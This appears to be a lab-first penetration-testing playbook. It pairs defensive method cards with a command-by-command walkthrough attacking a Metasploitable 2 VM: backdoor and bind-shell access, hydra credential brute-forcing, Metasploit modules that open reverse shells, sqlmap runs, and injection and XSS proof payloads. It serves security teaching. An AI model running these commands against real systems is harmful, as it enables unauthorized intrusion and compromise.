text: **Objective:** Observe app behavior, traffic, storage, and runtime protections in a controlled environment. **Lab:** Own app on emulator/test phone and test backend. **Tools:** - Frida — Runtime instrumentation in lab - Objection — Mobile runtime exploration - Burp Suite — Intercept API traffic - MobSF dynamic — Dynamic analysis - adb — Logs/files/process inspection **Method:** 1. Install the app in a controlled emulator/device and proxy traffic to Burp. 2. Observe login, tokens, storage, logs, backups, clipboard, and network calls. 3. Use runtime instrumentation only against your own app to inspect security controls. 4. Test TLS validation, certificate handling, root detection, tamper checks, and session behavior. 5. Retest after secure storage, TLS hardening, logging cleanup, and tamper controls. **Evidence:** Traffic capture, storage screenshot, runtime logs, control bypass evidence in lab. **Defense:** Secure storage, TLS validation, minimal logging, strong auth/session handling.

title: II-59. Deep Links, WebViews, and IPC Abuse
text: **Objective:** Test mobile entry points that accept input from other apps or browser contexts. **Lab:** Own Android/iOS app in emulator. **Tools:** - adb — Trigger intents and inspect logs - jadx/apktool — Review exported components - Frida/Objection — Runtime inspection - Burp Suite — WebView/network traffic **Method:** 1. Map exported activities, URL schemes, deep links, WebViews, broadcast receivers, providers, and IPC endpoints. 2. Send controlled test inputs and observe routing, auth checks, redirects, and data exposure. 3. Check WebView JavaScript bridges, file access, token exposure, and untrusted content loading. 4. Retest after component restrictions, input validation, and safe WebView settings. **Evidence:** Deep-link test, exported component proof, WebView behavior, logs. **Defense:** Restrict exports, validate input, disable risky bridges, least-privilege IPC.

title: II-60. Firmware Extraction and Secret Hunting
text: **Objective:** Extract and inspect firmware for services, configs, keys, credentials, and update weaknesses. **Lab:** Own firmware image or device. **Tools:** - binwalk — Extract firmware - EMBA — Automated firmware analysis - Firmwalker — Firmware filesystem review - Firmware Analysis Toolkit — Emulation - strings — Manual inspection **Method:** 1. Identify vendor, model, version, architecture, bootloader, filesystem, and update mechanism. 2. Extract filesystem and inventory binaries, configs, scripts, keys, certificates, and credentials. 3. Look for startup services, debug interfaces, default passwords, private keys, and update URLs. 4. Emulate or boot the device in isolation and validate exposed services. 5. Report hardcoded secrets, weak crypto, unsigned updates, and unnecessary services. **Evidence:** Extracted filesystem, secret/key evidence, service inventory, emulation output. **Defense:** Signed updates, unique credentials, no embedded private keys, minimal services, secure boot.

title: II-61. IoT Protocol and Service Audit
text: **Objective:** Audit MQTT, HTTP, Telnet, UPnP, Modbus-like services, and device update behavior. **Lab:** Own IoT device or simulated services on a lab VLAN. **Tools:** - nmap — Service discovery - mosquitto clients — MQTT testing - Wireshark — Protocol inspection - Router/firewall logs — Traffic review - Firmware tools — Config/secrets **Method:** 1. Scan only lab devices and inventory open services, ports, and protocols. 2. Check authentication, TLS, default credentials, topic permissions, and exposed management interfaces. 3. Observe traffic for plaintext secrets, telemetry leakage, and unexpected cloud calls. 4. Segment the device and disable unneeded services. 5. Retest after authentication, encryption, segmentation, and firmware update. **Evidence:** Service inventory, protocol evidence, plaintext traffic proof, firewall rule. **Defense:** Device segmentation, TLS/auth, unique credentials, update, disable unused services.

title: II-62. Consent-Based Phishing Awareness
text: **Objective:** Teach users to verify and report suspicious messages without stealing credentials. **Lab:** Approved organization, consenting participants, fake scenario, no credential collection. **Tools:** - Approved phishing simulator — Consent-based training only - Training landing page — Teach verification - Email headers — Show sender/domain clues - Report metrics — Measure safe behavior **Method:** 1. Get written authorization and define audience, tone, boundaries, and data collection. 2. Use fake data and a training page that does not collect passwords or MFA codes. 3. Choose one lesson: urgency, lookalike domain, attachment, QR code, payment request, or MFA prompt. 4. Measure verification/reporting behavior, not shame. 5. Debrief with practical checks and improve reporting channels. **Evidence:** Approval, scenario, report rate, debrief notes, no-sensitive-data confirmation. **Defense:** Verification habits, report button, MFA, DMARC, payment approval, awareness training.

title: II-63. Pretext and Impersonation Awareness
text: **Objective:** Show how public information makes fake requests believable and how verification stops them. **Lab:** Consenting staff and fake internal scenario. **Tools:** - OSINT — Understand public exposure - Call scripts — Consent-based training - Ticket/report workflow — Measure reporting **Method:** 1. Use only approved fictional vendors, staff names, or lab accounts. 2. Demonstrate how public job posts, LinkedIn details, and breached contact formats enable believable pretexts. 3. Test whether the person verifies through a known channel before acting. 4. Do not collect credentials, secrets, payments, or private information. 5. Debrief and improve verification policy. **Evidence:** Scenario, verification result, public-data source, training outcome. **Defense:** Known-channel verification, least public exposure, approval workflows.

title: II-64. USB and Physical Access Awareness
text: **Objective:** Teach safe handling of unknown devices and physical access paths. **Lab:** Consenting lab with harmless USB test devices and no malware. **Tools:** - Rubber Ducky-style benign script — Optional safe lab demo - Autorun/device logs — Show device events - Asset tags — Physical control - Camera/badge policy — Physical review **Method:** 1. Define consent, devices, locations, and safe payloads; use harmless files or notifications only. 2. Test whether staff plug in unknown devices or report them. 3. Review unattended screens, unlocked cabinets, visitor access, and exposed network ports. 4. Do not deploy malware or access personal systems. 5. Teach reporting, screen locking, device control, and visitor procedures. **Evidence:** Training result, device event log, physical control evidence, debrief. **Defense:** Device control, USB restrictions, screen lock, visitor process, reporting culture.

title: II-65. Static Malware Triage
text: **Objective:** Analyze a suspicious file safely before executing anything. **Lab:** Isolated analysis VM with no production network. **Tools:** - VirusTotal-style metadata — Known-sample reputation - YARA — Pattern matching - Ghidra — Static reverse engineering - strings/binwalk — Content inspection - pestudio — Windows PE review **Method:** 1. Work only on a sample in an isolated lab or use public known samples. 2. Record hashes, size, type, imports, sections, strings, certificates, and embedded resources. 3. Classify likely behavior without executing the sample. 4. Extract indicators and decide what deserves dynamic analysis. 5. Document confidence and safe handling notes. **Evidence:** Hash, file type, strings/imports, YARA hits, triage report. **Defense:** Static triage reduces exposure and creates early detection opportunities.

title: II-66. Dynamic Malware Behavior Analysis
text: **Objective:** Observe what a sample does inside an isolated analysis VM. **Lab:** Snapshot-based malware VM with simulated or tightly controlled networking. **Tools:** - Procmon — Process/file/registry behavior - Wireshark/FakeDNS/INetSim — Network behavior - x64dbg — Debugging where needed - CAPE/Sandbox — Automated behavior reporting - Sysmon — Windows telemetry **Method:** 1. Snapshot the VM, disable shared folders, and control networking. 2. Collect baseline process, filesystem, registry, persistence, and network state. 3. Run the sample briefly and monitor behavior. 4. Extract reliable indicators and map behavior to MITRE ATT&CK. 5. Write detections and revert the snapshot. **Evidence:** Behavior timeline, packet capture, persistence evidence, IOCs, ATT&CK mapping. **Defense:** EDR telemetry, egress monitoring, detections, application control.

title: II-67. Detection Engineering with Sigma and YARA
text: **Objective:** Turn attack behavior into reusable detections. **Lab:** Logs or artifacts generated by your own lab tests. **Tools:** - Sigma — Log detection rules - YARA — File/content detection - Hayabusa — Windows event analysis - Zeek/Suricata — Network detection - Atomic Red Team — Safe technique validation **Method:** 1. Pick one attack behavior from a lab test. 2. Identify the best telemetry source: process, auth, DNS, file, registry, network, cloud, or app log. 3. Write a detection that balances precision and coverage. 4. Replay the test and confirm the detection fires. 5. Tune for false positives and document response guidance. **Evidence:** Rule, log sample, alert proof, false-positive notes, ATT&CK mapping. **Defense:** Behavior-based detections survive tool changes better than raw IOC lists.

title: II-68. Memory and Disk Forensics
text: **Objective:** Investigate a compromised lab VM and build a timeline. **Lab:** Own compromised test VM with memory/disk capture. **Tools:** - Volatility 3 — Memory analysis - Sleuth Kit — Disk/filesystem analysis - Plaso — Timeline generation - Velociraptor — Endpoint collection - FTK/Autopsy — Forensic review **Method:** 1. Capture memory and disk state after a controlled incident simulation. 2. Identify processes, network connections, injected code, persistence, accounts, and artifacts. 3. Build a timeline across filesystem, registry, logs, browser, and process evidence. 4. Separate attacker actions from normal user/system behavior. 5. Preserve evidence and document analysis decisions. **Evidence:** Memory/disk artifacts, timeline, malicious process evidence, report. **Defense:** Forensics turns a vague compromise into an explainable incident.

title: II-69. Network Forensics and C2 Awareness
text: **Objective:** Analyze network evidence to understand compromise and build detections without deploying real C2. **Lab:** Lab traffic from benign simulations or known analysis datasets. **Tools:** - Wireshark — Packet analysis - Zeek — Network metadata and logs - Suricata — IDS alerts - RITA/NetworkMiner-style tools — Traffic review - pcap datasets — Safe practice data **Method:** 1. Use lab-generated traffic or public safe PCAPs. 2. Identify DNS, HTTP, TLS, beaconing-like timing, unusual destinations, and data volumes. 3. Map network events to endpoint logs where possible. 4. Write detections for suspicious patterns and test them. 5. Tune alerts and document response steps. **Evidence:** PCAP, Zeek logs, alert rule, timeline, endpoint correlation. **Defense:** Network visibility reveals behavior even when endpoints hide details.

title: II-70. Severity, Evidence, and Report Writing
text: **Objective:** Turn technical findings into clear business risk and actionable fixes. **Lab:** Any lab finding. **Tools:** - CVSS calculator — Severity baseline - Dradis/Faraday — Finding management - Screenshots/logs — Evidence - MITRE ATT&CK — Behavior context **Method:** 1. Write a plain-English summary before technical details. 2. State affected asset, precondition, attack path, impact, likelihood, evidence, and scope. 3. Score severity consistently and explain business impact. 4. Give exact remediation and a retest step. 5. Include raw evidence only where needed; redact secrets and personal data. **Evidence:** Finding title, impact statement, evidence, CVSS/context, remediation, retest result. **Defense:** Good reports make fixes happen faster than exploit screenshots alone.

title: II-71. Retest and Defense Validation
text: **Objective:** Confirm that a fix actually removes the attack path instead of just hiding the symptom. **Lab:** Patched lab target or staging environment. **Tools:** - Original toolset — Repeat the exact test - Logs/monitoring — Confirm detection/prevention - Regression tests — Prevent recurrence - Report checklist — Close the loop **Method:** 1. Re-run the original test after the fix using the same evidence standard. 2. Check whether the vulnerability is gone, partially fixed, or moved to another path. 3. Verify logs and alerts show the attempt if prevention fails. 4. Add automated regression or CI checks where possible. 5. Update the report with retest evidence and residual risk. **Evidence:** Retest request/response, alert evidence, config diff, final status. **Defense:** A fix is not real until it survives the original attack path and alerts when needed.

title: III-1. Lab network setup and target discovery
text: Put Kali and Metasploitable 2 on the same isolated network, find the target IP, and set reusable shell variables. - `ip a` — Shows your local interfaces and IP address. - `sudo arp-scan --localnet` — Sends ARP requests on the local network to discover live machines. - `sudo nmap -sn 192.168.56.0/24` — Performs a ping sweep without port scanning. - `export MS2=192.168.56.101` — Stores the Metasploitable IP in a shell variable. - `export KALI=192.168.56.102` — Stores your attacker IP for reverse connections. - `ping -c 4 $MS2` — Checks whether the target responds to ICMP. - `sudo tcpdump -i eth0 host $MS2 -w ms2-lab.pcap` — Captures traffic between Kali and MS2 for later evidence.

title: III-2. Full Nmap scan and service map
text: Build the real attack surface inventory before touching exploits. - `nmap -sn $MS2` — Checks whether the target appears alive to Nmap. - `nmap -sS --top-ports 100 -sV $MS2` — SYN-scans common ports and fingerprints service versions. - `sudo nmap -sS -sV -sC -O -p- -T4 -oA ms2_full $MS2` — Scans every TCP port, fingerprints services, runs default scripts, detects OS, and saves output. - `less ms2_full.nmap` — Opens the main Nmap report. - `sudo nmap -sU --top-ports 100 -sV -oA ms2_udp $MS2` — Checks the top UDP services. - `grep '^ *[0-9].*open' ms2_full.nmap` — Prints only open service lines.

title: III-3. FTP enumeration and banner review
text: Fingerprint FTP, identify vulnerable versions, and document misconfigurations. - `nc -nv $MS2 21` — Connects to FTP and displays the service banner. - `nmap -p21 --script ftp-anon,ftp-bounce,ftp-syst $MS2` — Checks anonymous login, bounce behavior, and FTP system info. - `searchsploit vsftpd 2.3.4` — Finds public exploit references for the detected version.

title: III-4. vsftpd 2.3.4 backdoor exploitation
text: Trigger and validate the known vsftpd 2.3.4 backdoor in a lab. - `nc -nv $MS2 21` — The vulnerable FTP daemon opens a backdoor listener after the crafted username. - `nc -nv $MS2 6200` — Connects to the opened bind shell and runs `id`. - `msfconsole -q` — Automates the same backdoor trigger through Metasploit.

title: III-5. Direct bind shell on port 1524
text: Show why an unexplained listening shell is critical exposure. - `nmap -p1524 -sV $MS2` — Fingerprints the direct shell listener. - `nc -nv $MS2 1524` — Opens a direct TCP connection to the shell. - `id` — Shows which user the exposed shell runs as. - `ss -tulpn | grep 1524` — On the target, shows which process owns the listener.

title: III-6. SSH password auditing
text: Audit SSH logins with a small lab credential list. - `cat > ms2-users.txt <<'EOF'` — Creates a small lab-only username list. - `cat > ms2-passwords.txt <<'EOF'` — Creates a small lab-only password list. - `hydra -L ms2-users.txt -P ms2-passwords.txt -t 4 -f ssh://$MS2` — Tests the small username/password list against SSH at low speed. - `ssh msfadmin@$MS2` — Logs in with the lab account.

title: III-7. Telnet password auditing and plaintext proof
text: Test Telnet lab credentials and show why plaintext remote access is unsafe. - `cat > ms2-users.txt <<'EOF'` — Creates a small lab-only username list. - `cat > ms2-passwords.txt <<'EOF'` — Creates a small lab-only password list. - `hydra -L ms2-users.txt -P ms2-passwords.txt -t 4 -f telnet://$MS2` — Tests the same lab credentials against Telnet. - `sudo tcpdump -i eth0 host $MS2 and port 23 -A` — Displays TCP payloads for the Telnet session. - `telnet $MS2` — Opens the remote Telnet prompt.

title: III-8. SMTP user enumeration
text: Test whether SMTP reveals valid usernames. - `nc -nv $MS2 25` — Opens an SMTP session. - `VRFY msfadmin` — Asks SMTP whether accounts exist. - `nmap -p25 --script smtp-commands,smtp-enum-users $MS2` — Enumerates supported SMTP commands and users. - `smtp-user-enum -M VRFY -U ms2-users.txt -t $MS2` — Automates VRFY-based account checks.

title: III-9. RPC service discovery
text: Discover RPC services and ports exposed by the VM. - `rpcinfo -p $MS2` — Shows registered RPC services and ports.

title: III-10. NFS export exposure and mount proof
text: Check whether NFS exports can be mounted and whether harmless write proof is possible. - `showmount -e $MS2` — Displays NFS directories exported by the target. - `sudo mkdir -p /mnt/ms2` — Creates a local directory for the remote filesystem. - `sudo mount -t nfs $MS2:/ /mnt/ms2` — Mounts the exported filesystem from the VM. - `sudo touch /mnt/ms2/tmp/ms2-lab-marker.txt` — Proves whether write access is possible. - `sudo umount /mnt/ms2` — Disconnects the remote filesystem.

title: III-11. SMB share and user enumeration
text: Enumerate Samba shares, users, permissions, and OS details. - `smbclient -L //$MS2 -N` — Queries SMB share list without credentials. - `smbmap -H $MS2` — Shows readable/writable shares and permissions. - `enum4linux-ng -A $MS2` — Collects users, groups, shares, policy, and OS info. - `nmap -p139,445 --script smb-os-discovery,smb-enum-shares,smb-enum-users $MS2` — Uses Nmap to confirm OS, shares, and users.

title: III-12. Samba usermap exploitation
text: Use the lab Samba usermap path for controlled command execution. - `msfconsole -q` — Starts Metasploit. - `use exploit/multi/samba/usermap_script` — Sends the lab exploit and opens a reverse command shell. - `id` — Confirms remote execution on MS2.

title: III-13. HTTP recon and content discovery
text: Map the web attack surface before choosing web attacks. - `curl -I http://$MS2/` — Shows HTTP status and response headers. - `curl http://$MS2/ | head -n 40` — Shows the beginning of the HTML response. - `nikto -h http://$MS2` — Finds common web server misconfigurations and files. - `dirb http://$MS2 /usr/share/wordlists/dirb/common.txt` — Brute-forces common directories/files. - `gobuster dir -u http://$MS2 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html` — Fast route/file discovery with extensions. - `curl http://$MS2/phpinfo.php | head -n 30` — Reveals PHP configuration if exposed. - `for p in mutillidae dvwa phpMyAdmin dav twiki server-status; do echo "=== /$p"; curl -s -o /dev/null -w '%{http_code}\n' http://$MS2/$p/; done` — Checks multiple likely web paths quickly.

title: III-14. WebDAV write access
text: Prove whether the web server allows unauthenticated file upload through DAV. - `curl -I http://$MS2/dav/` — Checks whether DAV responds. - `echo 'CYBER-AI LAB MARKER' > lab-marker.txt` — Creates a harmless upload proof. - `cadaver http://$MS2/dav/` — Starts a command-line WebDAV session. - `put lab-marker.txt` — Uploads a harmless file and lists the remote directory. - `curl http://$MS2/dav/lab-marker.txt` — Downloads the marker through the web server.

title: III-15. Mutillidae SQL injection workflow
text: Test the intentionally vulnerable Mutillidae app for database injection. - `curl -I http://$MS2/mutillidae/` — Confirms the app exists. - `python3 - <<'PY'` — Reminder step: proxy the browser before testing. - `sqlmap -u "http://$MS2/mutillidae/index.php?page=login.php" --forms --batch --level=2 --risk=1 --current-db` — Detects forms and tests injection parameters in a lab app. - `sqlmap -u "http://$MS2/mutillidae/index.php?page=login.php" --forms --batch --banner` — Shows DBMS banner/version through the vulnerable app. - `curl -I http://$MS2/mutillidae/ && sudo tail -n 30 /var/log/apache2/access.log` — Shows the request and Apache access evidence if you run it on the target.

title: III-16. DVWA setup and SQL injection
text: Configure DVWA and prove SQL injection on the lab page. - `curl -I http://$MS2/dvwa/` — Confirms DVWA responds. - `echo 'Open http://'$MS2'/dvwa/setup.php in your browser'` — Prints the setup URL. - `echo 'Default lab login: admin / password'` — Provides the standard lab credentials. - `echo "http://$MS2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"` — Shows the SQL Injection challenge endpoint. - `sqlmap -u "http://$MS2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<YOUR_SESSION>; security=low" --batch --current-db` — Tests the authenticated DVWA SQLi page.

title: III-17. DVWA command injection and file inclusion
text: Demonstrate safe command injection and file inclusion proofs inside DVWA. - `echo 'DVWA command injection lab input: 127.0.0.1; id'` — Shows a harmless command-injection proof input. - `echo 'Use a harmless path such as /etc/hostname in the DVWA file inclusion lab'` — Keeps the file-inclusion proof safe.

title: III-18. DVWA reflected and stored XSS
text: Demonstrate safe XSS proof in a lab page. - `echo 'Open http://'$MS2'/dvwa/vulnerabilities/xss_r/'` — Prints the reflected XSS challenge URL. - `echo 'Lab input: <script>alert(1)</script>'` — Shows the standard harmless alert proof for a lab page.

title: III-19. DVWA file inclusion attack
text: Demonstrate file inclusion using only harmless lab files. - `echo 'Open http://'$MS2'/dvwa/vulnerabilities/fi/'` — Prints the file-inclusion challenge URL. - `echo 'Lab proof: /etc/hostname'` — Uses a harmless file to prove local inclusion.

title: III-20. DVWA CSRF and session headers
text: Review CSRF and cookie/session protection in DVWA. - `echo 'Open http://'$MS2'/dvwa/vulnerabilities/csrf/'` — Prints the CSRF challenge URL. - `curl -I http://$MS2/dvwa/` — Shows response headers for cookie/session hints.

title: III-21. Tomcat manager and WAR upload
text: Test weak Tomcat manager access and understand why manager apps are high risk. - `curl -I http://$MS2:8180/` — Checks HTTP headers and Tomcat service version. - `curl -I http://$MS2:8180/manager/html` — Checks whether Tomcat Manager responds. - `echo 'Try only lab defaults: tomcat/tomcat or admin/admin'` — Keeps credential testing to known MS2 defaults. - `msfconsole -q` — Starts Metasploit. - `use exploit/multi/http/tomcat_mgr_upload` — Uploads a controlled app through manager access and opens a session if vulnerable. - `sysinfo` — Shows system and user context from Meterpreter.

title: III-22. MySQL weak/default access
text: Audit MySQL for weak or empty lab credentials. - `nmap -p3306 --script mysql-info,mysql-empty-password $MS2` — Collects MySQL info and checks empty password conditions. - `mysql -h $MS2 -u root -p` — Starts MySQL client login. - `SHOW DATABASES;` — Shows accessible databases and account hosts.

title: III-23. PostgreSQL weak/default access
text: Audit PostgreSQL for weak lab credentials and remote access. - `nmap -p5432 -sV $MS2` — Fingerprints PostgreSQL service. - `psql "host=$MS2 user=postgres password=postgres"` — Attempts lab `postgres/postgres` login. - `\l` — Lists databases, roles, and connection context.

title: III-24. VNC weak remote desktop
text: Audit VNC for weak lab credentials and exposed display. - `nmap -p5900 --script vnc-info $MS2` — Collects VNC protocol/security info. - `vncviewer $MS2:5900` — Connects to the remote display.

title: III-25. X11 open display exposure
text: Check whether X11 display access is exposed and capture harmless proof. - `nmap -p6000 --script x11-access $MS2` — Checks whether the X display is accessible. - `xwd -root -silent -display $MS2:0 -out ms2-screen.xwd` — Captures the remote X display if open.

title: III-26. UnrealIRCd backdoor
text: Exploit the known vulnerable IRC daemon in a controlled lab. - `nmap -p6667 -sV $MS2` — Fingerprints the IRC daemon. - `msfconsole -q` — Finds matching exploit modules. - `use exploit/unix/irc/unreal_ircd_3281_backdoor` — Triggers the IRC backdoor and opens a reverse command shell. - `id` — Confirms remote execution. - `nmap -p6697 -sV $MS2` — Checks whether a second IRC listener exists.

title: III-27. distccd remote command execution
text: Test the exposed compiler service that can run commands. - `nmap -p3632 -sV $MS2` — Identifies the distccd service. - `nmap -p3632 --script distcc-cve2004-2687 $MS2` — Checks for the known distcc command execution issue. - `msfconsole -q` — Finds the distcc exploit module. - `use exploit/unix/misc/distcc_exec` — Sends a lab exploit request and opens a reverse shell if vulnerable. - `id` — Confirms command execution context.

title: III-28. Java RMI service exposure
text: Check the remote Java service for unsafe object/service exposure. - `nmap -p1099 -sV $MS2` — Fingerprints Java RMI registry. - `nmap -p1099 --script rmi-vuln-classloader $MS2` — Checks for known classloader exposure. - `msfconsole -q` — Finds Java RMI modules. - `use exploit/multi/misc/java_rmi_server` — Attempts the lab RMI exploit path.

title: III-29. ccProxy/FTP service on 2121
text: Fingerprint and test the alternate FTP/proxy service. - `nmap -p2121 -sV $MS2` — Fingerprints the secondary FTP/proxy service. - `ftp $MS2 2121` — Attempts FTP login prompt.

title: III-30. Apache AJP connector on 8009
text: Audit the Tomcat AJP connector for unnecessary exposure. - `nmap -p8009 -sV $MS2` — Checks the Tomcat AJP connector. - `nmap -p8009 --script ajp-methods,ajp-headers,ajp-auth $MS2` — Enumerates connector behavior.

title: III-31. Ruby DRb service on 8787
text: Fingerprint and test the Ruby DRb service where present. - `nmap -p8787 -sV --script druby-info $MS2` — Checks Ruby DRb service info. - `msfconsole -q` — Attempts the Ruby DRb exploit path if your build exposes it.

title: III-32. Metasploit database and workspace
text: Use Metasploit DB and workspaces to store host/service evidence. - `sudo msfdb init` — Initializes the Metasploit PostgreSQL-backed database. - `msfconsole -q` — Opens Metasploit quietly. - `workspace -a ms2-course` — Creates and activates a named workspace. - `db_nmap -sS -sV -p- 192.168.56.101` — Runs Nmap through Metasploit and stores hosts/services. - `hosts` — Lists stored target hosts and services.

title: III-33. Metasploit modules, payloads, and sessions
text: Select modules, configure payloads, run checks, and manage sessions. - `search vsftpd` — Finds modules matching detected services. - `use exploit/path/module` — The normal module workflow: inspect, configure, check, run. - `sessions -l` — Lists, enters, backgrounds, and closes sessions.

title: III-34. Post-exploitation host and process review
text: Review user, host, network, and process context after lab access. - `id` — Shows current account and privileges. - `hostname` — Shows hostname, kernel, and OS. - `ip a` — Shows interfaces, routes, and listening services. - `ps aux | head -n 40` — Shows running processes.

title: III-35. Privilege indicators, persistence and logs
text: Review privilege indicators, persistence locations, and useful logs. - `sudo -l` — Checks sudo rights and common SUID binaries. - `crontab -l` — Shows where persistence might appear. - `sudo tail -n 100 /var/log/auth.log` — Shows recent authentication events. - `sudo tail -n 100 /var/log/apache2/access.log` — Shows web requests and errors.

title: III-36. Defense validation and retest
text: Prove the fix or hardening step removes the attack path. - `echo 'Save original banner/request/session/id evidence'` — Reminds you to keep baseline evidence. - `echo 'Example: upgrade service, disable listener, require auth, firewall port'` — Maps attack to defense. - `nmap -p21,23,139,445,1524,3306,3632,5432,5900,6667,8180 $MS2` — Checks whether risky ports are still reachable. - `nc -nv $MS2 6200` — Checks whether the vulnerable backdoor listener still exists. - `cat > finding-template.txt <<'EOF'` — Creates a small report template.

title: III-37. DNS and BIND enumeration
text: Collect DNS version, recursion behavior, zone hints, and misconfigurations. - `nmap -p53 -sV $MS2` — Fingerprints DNS service and version. - `dig version.bind CHAOS TXT @$MS2` — Asks the DNS server for its software version when disclosed. - `dig @$MS2 localhost` — Checks whether the server answers a basic query. - `dig @$MS2 example.com AXFR` — Tests whether the server allows a zone transfer for a test zone. - `dnsrecon -d localhost -n $MS2` — Runs broader DNS enumeration against the target. - `nmap -p53 --script dns-recursion,dns-cache-snoop,dns-service-discovery $MS2` — Uses NSE checks for common DNS configuration issues.

title: III-38. phpinfo and Apache status/info pages
text: Find diagnostic pages that disclose configuration and environment details. - `curl -I http://$MS2/phpinfo.php` — Checks whether PHP configuration is exposed. - `curl http://$MS2/phpinfo.php | head -n 40` — Shows the start of the PHP configuration page. - `curl -I http://$MS2/server-status` — Checks whether Apache status is exposed. - `curl -I http://$MS2/server-info` — Checks another Apache diagnostic page.

title: III-39. Hidden files, backups, .git and config exposure
text: Find web-accessible backups, configs, source archives, and repository metadata. - `curl -I http://$MS2/.git/HEAD` — Checks whether repository metadata is web-accessible. - `gobuster dir -u http://$MS2 -w /usr/share/wordlists/dirb/common.txt -x bak,old,conf,config,sql,zip,tar,txt` — Looks for backups, configs, source archives, and text files. - `nikto -h http://$MS2 -o ms2-nikto.txt` — Saves web server findings to a report file.

title: III-40. phpMyAdmin and database admin exposure
text: Check whether a database admin panel is exposed and protected by weak credentials. - `curl -I http://$MS2/phpMyAdmin/` — Checks whether phpMyAdmin exists. - `nmap -p80 --script http-enum $MS2` — Finds common web admin paths. - `echo 'Try only lab defaults: root/<empty>, root/root, phpmyadmin/phpmyadmin'` — Keeps credential testing inside the lab. - `mysql -h $MS2 -u root -p` — Confirms whether DB service access matches panel access. - `searchsploit phpmyadmin` — Finds public issues for the detected version.

title: III-41. TWiki legacy web application
text: Identify the legacy TWiki app and test matching public exploit paths. - `curl -I http://$MS2/twiki/` — Confirms whether TWiki responds. - `nmap -p80 --script http-enum $MS2` — Finds common HTTP paths including TWiki. - `searchsploit twiki` — Finds TWiki exploit references. - `msfconsole -q` — Finds Metasploit modules for TWiki. - `use exploit/unix/webapp/twiki_history` — Attempts the common TWiki lab path if the installed module matches. - `id` — Confirms command execution context.

title: III-42. Legacy r-services: rexec, rlogin, rsh
text: Check whether old plaintext remote services allow access or expose unnecessary attack surface. - `nmap -p512,513,514 -sV $MS2` — Identifies rexec/rlogin/rsh services. - `rlogin -l msfadmin $MS2` — Attempts remote login as the lab user. - `rsh -l msfadmin $MS2 id` — Attempts a remote command through rsh. - `rexec -l msfadmin $MS2 id` — Attempts rexec remote execution. - `sudo tcpdump -i eth0 host $MS2 and port 513 -A` — Shows plaintext rlogin traffic in the lab.

title: III-43. Bind shell vs reverse shell methods
text: Understand the two common shell connection patterns and when each is used. - `nc -nv $MS2 1524` — Connects to a shell already listening on the target. - `nc -lvnp 4444` — Makes Kali listen for a reverse connection. - `msfconsole -q` — Creates a Metasploit listener for reverse payloads. - `sessions -l` — Shows active Metasploit sessions. - `sessions -i 1` — Opens a session interactively. - `echo 'Bind shell: attacker -> target listener. Reverse shell: target -> attacker listener.'` — Creates a simple note for your report/video.

title: III-44. Exploit selection and validation method
text: Choose the right exploit path instead of blindly launching modules. - `nmap -sV -p21,22,23,25,80,139,445,1099,1524,2049,2121 $MS2` — Fingerprints all major MS2 services in two passes. - `searchsploit vsftpd` — Looks up public exploits for detected versions. - `msfconsole -q` — Finds MSF modules for the target services. - `use exploit/path/module` — Shows module details, requirements, options, and payloads. - `check` — Asks Metasploit whether the target looks vulnerable without exploitation. - `id` — Confirms real command execution if a session opens.

title: III-45. Evidence collection and video-safe reporting
text: Capture proof without exposing secrets and make it easy to explain on video. - `mkdir -p evidence/ms2` — Creates a folder for scan files, screenshots, logs, and notes. - `script -a evidence/ms2/session.log` — Records terminal commands and output for evidence. - `sudo nmap -sS -sV -p- $MS2 -oA evidence/ms2/full-scan` — Stores Nmap results in all formats inside the evidence folder. - `curl -i http://$MS2/phpinfo.php -o evidence/ms2/phpinfo-response.txt` — Saves response headers/body to an evidence file. - `shasum -a 256 evidence/ms2/* > evidence/ms2/SHA256SUMS.txt` — Creates hashes for evidence integrity. - `tar -czf ms2-evidence.tar.gz evidence/ms2` — Creates a compressed evidence archive.

title: Purpose
text: This playbook gives structured, repeatable methods for practicing real security attacks against systems you own or are explicitly authorized to test. It is written for lab-first learning and defensive explanation. This is not a permission slip. If a target is not yours or not in written scope, do not test it.

title: Universal Attack Method
text: 1. Define scope and permission. 2. Build or select a legal lab target. 3. Map the attack surface. 4. Pick one hypothesis to test. 5. Run the smallest safe proof. 6. Capture evidence. 7. Explain why it worked. 8. Apply the defense. 9. Retest. 10. Report clearly.

title: How to Use Each Playbook
text: Each section gives the objective, lab setup, useful tools, method steps, evidence to collect, and the defense that should appear at the end of your video or report.

title: 1. Scope, Lab Setup, and Rules of Engagement
text: **Objective:** Turn random hacking into a controlled, repeatable security test. **Safe lab:** A VM network, intentionally vulnerable apps, snapshots, dummy users, and written permission for anything not owned by you. **Tools to use:** - **VirtualBox/VMware/UTM:** Build isolated target machines - **Docker:** Run vulnerable apps and reset them cleanly - **Obsidian/CherryTree/notes app:** Track scope, findings, screenshots, and remediation - **DVWA, Juice Shop, WebGoat, Vulhub:** Legal practice targets **Method steps:** 1. Write down the target owner, allowed IP/domain range, allowed dates, and banned actions. 2. Create dummy users, dummy credentials, and fake data; never use real customer/follower data. 3. Snapshot every VM before testing so you can reset to a clean state. 4. Separate the lab network from production devices and personal accounts. 5. Define what success means: proof of impact, screenshot, log, or defensive alert. 6. After testing, document the attack path and the exact fix that reduces the risk. **Evidence to capture:** Scope notes, target inventory, screenshots, timestamps, tool versions, and before/after test results. **Defense to teach:** A repeatable lab makes attacks boring and defenses measurable. **Search words:** lab setup, scope, rules, legal testing, hacking lab

title: 2. Recon and OSINT on Your Own Assets
text: **Objective:** Discover what an outsider can learn before touching the target. **Safe lab:** Your own domain, IP range, usernames, public profiles, and intentionally exposed test assets. **Tools to use:** - **Sherlock:** Find where a username exists across sites - **Maigret:** Build a username/profile footprint - **SpiderFoot:** Automate OSINT collection and correlation - **subfinder/amass:** Enumerate subdomains you own - **httpx:** Check which discovered services respond - **theHarvester:** Collect emails, hosts, and public names **Related tools from the 1000-tool catalog:** `sherlock-project/sherlock`, `soxoj/maigret`, `lissy93/web-check`, `qeeqbox/social-analyzer`, `smicallef/spiderfoot`, `Datalux/Osintgram` **Method steps:** 1. Start with domains, usernames, brand names, emails, and IP ranges you own. 2. Collect public DNS, subdomains, certificates, social profiles, public repos, and exposed metadata. 3. Separate confirmed assets from guesses; do not mix rumors into scope. 4. Check which assets resolve, respond, and expose technology fingerprints. 5. Create an attack-surface map: entry points, owners, data sensitivity, and likely weak spots. 6. Remove or protect anything that should not be public. **Evidence to capture:** Asset list, subdomain list, screenshots, service URLs, public exposure notes. **Defense to teach:** Reduce public exposure, monitor 